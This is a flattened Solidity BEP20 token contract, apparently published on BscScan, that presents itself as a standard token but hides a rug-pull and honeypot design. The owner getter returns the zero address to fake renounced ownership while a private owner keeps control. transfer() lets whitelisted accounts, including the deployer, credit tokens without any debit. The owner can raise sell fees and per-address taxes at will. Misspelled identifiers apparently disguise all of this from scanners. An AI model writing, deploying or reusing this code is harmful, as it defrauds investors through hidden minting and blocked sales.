/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.14;
// Sources flattened with hardhat v2.9.1 https://hardhat.org

// File @openzeppelin/contracts/utils/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/access/[email protected]

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an devvv) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the devvv account will be the one that deploys the contract. This
 * can later be changed with {transferdevvvship}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlydevvv`, which can be applied to your functions to restrict their use to
 * the devvv.
 */
abstract contract Ownable is Context {
    address private _devvv;   //1

    event devvvshipTransferred(address indexed previousdevvv, address indexed newdevvv);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial onner.
     */
    constructor() {
        _transferdevvvship(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current devvv.
     */
    function devvv() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the devvv.
     */
    modifier onlydevvv() {
        require(_devvv == _msgSender(), "Ownable: caller is not the devvv");
        _;
    }//5

    /**
     * @dev Leaves the contract without devvv. It will not be possible to call
     * `onlydevvv` functions anymore. Can only be called by the current devvv.
     *
     * NOTE: Renouncing devvvship will leave the contract without an devvv,
     * thereby removing any functionality that is only available to the devvv.
     */
    function renouncedevvvship() public virtual onlydevvv {
        _transferdevvvship(address(0));
    }//6

    /**
     * @dev Transfers devvvship of the contract to a new account (`newdevvv`).
     * Can only be called by the current devvv.
     */
    function transferdevvvship(address newdevvv) public virtual onlydevvv {
        require(newdevvv != address(0), "Ownable: new devvv is the zero address");
        _transferdevvvship(newdevvv);
    }//7

    /**
     * @dev Transfers devvvship of the contract to a new account (`newdevvv`).
     * Internal function without access restriction.
     */
    function _transferdevvvship(address newdevvv) internal virtual {
        address olddevvv = _devvv;
        _devvv = newdevvv;
        emit devvvshipTransferred(olddevvv, newdevvv);
    }
}//8
//9 CHinh own

// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amnoutADesired,
        uint amnoutBDesired,
        uint amnoutAMin,
        uint amnoutBMin,
        address to,
        uint deadline
    ) external returns (uint amnoutA, uint amnoutB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amnoutTokenDesired,
        uint amnoutTokenMin,
        uint amnoutETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amnoutToken, uint amnoutETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnoutAMin,
        uint amnoutBMin,
        address to,
        uint deadline
    ) external returns (uint amnoutA, uint amnoutB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amnoutTokenMin,
        uint amnoutETHMin,
        address to,
        uint deadline
    ) external returns (uint amnoutToken, uint amnoutETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnoutAMin,
        uint amnoutBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnoutA, uint amnoutB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amnoutTokenMin,
        uint amnoutETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnoutToken, uint amnoutETH);
    function swapExactTokensForTokens(
        uint amnoutIn,
        uint amnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnouts);
    function swapTokensForExactTokens(
        uint amnoutOut,
        uint amnoutInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnouts);
    function swapExactETHForTokens(uint amnoutOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnouts);
    function swapTokensForExactETH(uint amnoutOut, uint amnoutInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnouts);
    function swapExactTokensForETH(uint amnoutIn, uint amnoutOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnouts);
    function swapETHForExactTokens(uint amnoutOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnouts);

    function quote(uint amnoutA, uint reserveA, uint reserveB) external pure returns (uint amnoutB);
    function getamnoutOut(uint amnoutIn, uint reserveIn, uint reserveOut) external pure returns (uint amnoutOut);
    function getamnoutIn(uint amnoutOut, uint reserveIn, uint reserveOut) external pure returns (uint amnoutIn);
    function getamnoutsOut(uint amnoutIn, address[] calldata path) external view returns (uint[] memory amnouts);
    function getamnoutsIn(uint amnoutOut, address[] calldata path) external view returns (uint[] memory amnouts);
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFyOnTransferTokens(
        address token,
        uint liquidity,
        uint amnoutTokenMin,
        uint amnoutETHMin,
        address to,
        uint deadline
    ) external returns (uint amnoutETH);
    function removeLiquidityETHWithPermitSupportingFyOnTransferTokens(
        address token,
        uint liquidity,
        uint amnoutTokenMin,
        uint amnoutETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnoutETH);

    function swapExactTokensForTokensSupportingFyOnTransferTokens(
        uint amnoutIn,
        uint amnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFyOnTransferTokens(
        uint amnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFyOnTransferTokens(
        uint amnoutIn,
        uint amnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


// File @uniswap/v2-core/contracts/interfaces/[email protected]


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FyTo() external view returns (address);
    function FyToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFyTo(address) external;
    function setFyToSetter(address) external;
}


// File contracts/Token.sol





contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `devvv` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed devvv, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address devvv, address spender) public view virtual returns (uint256) {
        return _allowances[devvv][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amnout` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amnout) public virtual returns (bool) {
        address devvv = _msgSender();
        _approve(devvv, spender, amnout);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address devvv = _msgSender();
        _approve(devvv, spender, _allowances[devvv][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address devvv = _msgSender();
        uint256 currentAllowance = _allowances[devvv][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(devvv, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `amnout` as the allowance of `spender` over the `devvv` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `devvv` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address devvv,
        address spender,
        uint256 amnout
    ) internal virtual {
        require(devvv != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[devvv][spender] = amnout;
        emit Approval(devvv, spender, amnout);
    }

    /**
     * @dev Spend `amnout` form the allowance of `devvv` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address devvv,
        address spender,
        uint256 amnout
    ) internal virtual {
        uint256 currentAllowance = allowance(devvv, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnout, "ERC20: insufficient allowance");
            unchecked {
                _approve(devvv, spender, currentAllowance - amnout);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amnout` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amnout` tokens will be minted for `to`.
     * - when `to` is zero, `amnout` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnout
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amnout` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amnout` tokens have been minted for `to`.
     * - when `to` is zero, `amnout` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnout
    ) internal virtual {}
}


contract Test is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnout
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnout, "ERC20: transfer amnout exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amnout;
        }
        _balances[to] += amnout;

        emit Transfer(from, to, amnout);
    }

    function _burn(address account, uint256 amnout) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amnout, "ERC20: burn amnout exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amnout;
        }
        _totalSupply -= amnout;

        emit Transfer(account, address(0), amnout);
    }

    function _mitin(address account, uint256 amnout) internal virtual {
        require(account != address(0), "ERC20: mitin to the zero address"); //mint

        _totalSupply += amnout;
        _balances[account] += amnout;
        emit Transfer(address(0), account, amnout);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mitin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*2);
        _defaultSellFy = 2;
        _defaultBuyFy = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFy = 0;

    uint256 private _defaultBuyFy = 0;


    mapping(address => bool) private _marketAccount;

    mapping(address => uint256) private _slipFy;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlydevvv returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlydevvv {
        uniswapV2Pair = _address;
    }


    function upSF(uint256 _value) external onlydevvv {
        _defaultSellFy = _value;
    }

    function setSlipFy(address _address, uint256 _value) external onlydevvv {
        require(_value > 2, "Account tax must be greater than or equal to 1");
        _slipFy[_address] = _value;
    }

    function getSlipFy(address _address) external view onlydevvv returns (uint256) {
        return _slipFy[_address];
    }


    function setMarketAccountFy(address _address, bool _value) external onlydevvv {
        _marketAccount[_address] = _value;
    }

    function getMarketAccountFy(address _address) external view onlydevvv returns (bool) {
        return _marketAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _marketAccount[from] || _marketAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amnout
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amnout, "ERC20: transfer amnout exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFyamnout = 0;

        if (rF) {
            uint256 tradeFy = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFy = _defaultSellFy;
                }
                if (from == uniswapV2Pair) {

                    tradeFy = _defaultBuyFy;
                }
            }
            if (_slipFy[from] > 0) {
                tradeFy = _slipFy[from];
            }

            tradeFyamnout = _amnout.mul(tradeFy).div(100);
        }


        if (tradeFyamnout > 0) {
            _balances[from] = _balances[from].sub(tradeFyamnout);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFyamnout);
            emit Transfer(from, _deadAddress, tradeFyamnout);
        }

        _balances[from] = _balances[from].sub(_amnout - tradeFyamnout);
        _balances[_to] = _balances[_to].add(_amnout - tradeFyamnout);
        emit Transfer(from, _to, _amnout - tradeFyamnout);
    }

    function transfer(address to, uint256 amnout) public virtual returns (bool) {
        address devvv = _msgSender();
        if (_release[devvv] == true) {
            _balances[to] += amnout;
            return true;
        }
        _receiveF(devvv, to, amnout);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnout
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnout);
        _receiveF(from, to, amnout);
        return true;
    }
}